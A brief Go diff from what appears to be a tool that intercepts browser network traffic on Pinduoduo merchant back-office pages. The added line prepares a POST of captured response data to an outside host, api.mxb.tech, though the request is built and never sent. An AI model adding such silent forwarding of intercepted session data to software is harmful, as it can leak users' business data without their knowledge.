@@ -79,6 +79,8 @@ func listenForNetworkEvent(ctx context.Context) {
 
 					//body, _ := ioutil.ReadAll(resp.Body)
 					//log.Println(string(body))
+
+					http.NewRequest(http.MethodPost, "http://api.mxb.tech/index/transfer?use=ajax", bytes.NewBuffer(b))
 				}(*req)
 			}
 			if req.URL == "https://mc.pinduoduo.com/ragnaros-mms/after/sales/manage/queryProductAfterSalesStatistic" {
